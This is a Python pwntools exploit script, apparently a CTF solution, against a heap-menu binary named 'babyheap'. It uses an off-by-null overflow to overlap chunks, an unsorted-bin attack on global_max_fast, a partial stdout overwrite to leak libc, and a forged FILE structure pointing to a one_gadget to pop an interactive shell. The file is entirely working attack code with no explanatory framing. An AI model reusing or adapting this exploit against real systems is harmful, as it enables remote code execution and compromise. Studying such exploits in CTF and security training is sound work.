# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './babyheap'
e = ELF(file)
libc = e.libc
rlibc = ''
ip = ''
port = ''
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run(1)

def buy(index, size):
    sla('choice: ', '1')
    sla('want?', str(index))
    sla('big: ', str(size))
    
def write(idx, sign): # off by null
    sla('choice: ', '4')
    sla('?', str(idx))
    sla(': ', sign)

def throw(idx):
    sla('choice: ', '3')
    sla('?', str(idx))

buy(0,0xf8) # 000
buy(1,0xf8) # 100
buy(2,0xe8) # 200
buy(3,0xf8) # 2f0
buy(4, 0xf8) # 3f0
throw(0)
payload = 'c' * 0xe0 + p64(0x2f0) + 'a'
write(2, payload)
throw(3)
buy(0, 0x2f0 -0x10)  # 000
payload = '\x11' * 0xf0 
payload += p64(0) + p64(0x101)  # 恢复1号chunk
payload += '\x22' * 0xf0 + p64(0) + p64(0xf1) + "\n" # 恢复2号chunk
write(0, payload)
throw(1)
global_max_fast = 0x37f8
payload = '\x11' * 0xf0
payload += p64(0) + p64(0x101)
payload += p64(0) + p16(0x37f8 - 0x10) + '\n' # unsortedbin attack global max fast
write(0, payload)
buy(3, 0xf8)
buy(3, 0xf8)  # attack, 0x100
throw(2)
payload = '\x01' * 0xf8+p64(0x101)+'\x02'*0xf0+p64(0)+p64(0xf1)+'\xb7\x25'
write(0, payload)
buy(2, 0xe8)
buy(2, 0xe8)

payload = 'c' * 0x59 + p64(0xfbad1800) + p64(0) * 3 + '\x00' + '\n'
write(2, payload)
rn(0x48)
libc.address = un64(rn(8)) -0x3c56a3
success(hex(libc.address))

# fake_file的check需要注意
fake_file = p64(libc.address +0x3c6770)
fake_file += p64(0xffffffffffffffff)
fake_file += p64(0)
fake_file += p64(libc.address +0x3c55e0)
fake_file += p64(0) * 3 + p64(1)
fake_file += p64(libc.address +0xf1147) * 2
fake_file += p64(libc.address + 0x3c55c0 + 16+5*8)

payload = '\x00'+fake_file
write(2,payload)
success(hex(libc.address))
buy(2, 333)
shell()
